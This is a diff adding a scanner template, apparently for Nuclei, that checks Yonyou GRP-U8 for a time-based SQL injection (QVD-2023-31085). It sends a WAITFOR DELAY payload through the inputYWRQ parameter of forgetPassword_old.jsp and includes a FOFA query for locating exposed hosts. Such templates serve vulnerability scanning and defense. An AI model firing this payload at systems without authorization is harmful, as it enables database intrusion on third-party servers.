@@ -1,0 +1,27 @@
+id: QVD-2023-31085
+
+info:
+  name: QVD-2023-31085
+  author: yy
+  severity: high
+  description: QVD-2023-31085
+  tags: sqli
+  metadata:
+    fofa-qeury: app="用友-GRP-U8"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /u8qx/forgetPassword_old.jsp?action=save&idCard=1&userName=1&inputDW=1&inputYWRQ=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && duration>=5 && duration<=8 && contains(header,'text/html')" 
